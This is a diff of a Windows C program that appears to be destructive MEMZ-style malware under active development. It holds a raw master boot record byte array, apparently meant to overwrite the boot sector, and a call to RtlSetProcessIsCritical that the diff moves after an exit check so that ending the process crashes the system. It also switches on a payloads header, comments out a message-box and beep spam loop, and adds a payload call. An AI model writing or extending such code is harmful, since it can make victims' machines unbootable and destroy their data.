@@ -14,7 +14,7 @@
 #include <processthreadsapi.h>
 #include <tlhelp32.h>
 #include <utilapiset.h>
-//#include "payloads.h"
+#include "payloads.h"
 
 typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
@@ -37,14 +37,6 @@ int audio() {
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
 
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
-
-    HANDLE ntdll = LoadLibrary(L"ntdll.dll");
-    RtlSetProcessIsCritical SetCriticalProcess;
-
-    SetCriticalProcess = (RtlSetProcessIsCritical)
-        GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
-
-    SetCriticalProcess(TRUE, NULL, FALSE);
 
     const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
@@ -86,6 +78,14 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     {
         ExitProcess(0);
     }
+
+    HANDLE ntdll = LoadLibrary(L"ntdll.dll");
+    RtlSetProcessIsCritical SetCriticalProcess;
+
+    SetCriticalProcess = (RtlSetProcessIsCritical)
+        GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
+
+    SetCriticalProcess(TRUE, NULL, FALSE);
 
     //ShowWindow(GetConsoleWindow(), SW_HIDE);
 
@@ -140,7 +140,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, 0, &dwID1);
 
     //memz final payload effect but random
-    for (int i = 1; i < 50; i++) {
+    /*for (int i = 1; i < 50; i++) {
 
         //msgbox spam
         DWORD dwID = 0;
@@ -171,7 +171,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
         Beep(rand() % 30000, rand() % 1000);
 
-    }
+    }*/
+
+    p1();
 
     //i have no idea what this does
     HWND desktop = GetDesktopWindow();
